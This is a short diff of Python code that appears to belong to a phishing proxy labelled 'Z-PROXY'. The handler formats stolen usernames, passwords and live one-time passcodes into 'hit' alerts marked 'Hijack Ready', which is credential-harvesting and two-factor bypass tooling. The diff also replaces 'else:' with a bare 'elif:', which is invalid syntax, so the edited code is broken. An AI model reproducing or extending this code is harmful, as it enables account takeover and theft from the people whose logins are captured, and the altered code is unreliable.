@@ -30,7 +30,7 @@ def handle_requests():
             otp_code = data.get('o')
             msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **LIVE OTP: {otp_code}**\n🔥 Status: Hijack Ready"
 
-        else:
+        elif:
             # Login and Passwords
             password = data.get('p')
             msg = f"🚀 **NEW HIT DETECTED**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Status: {dtype}"
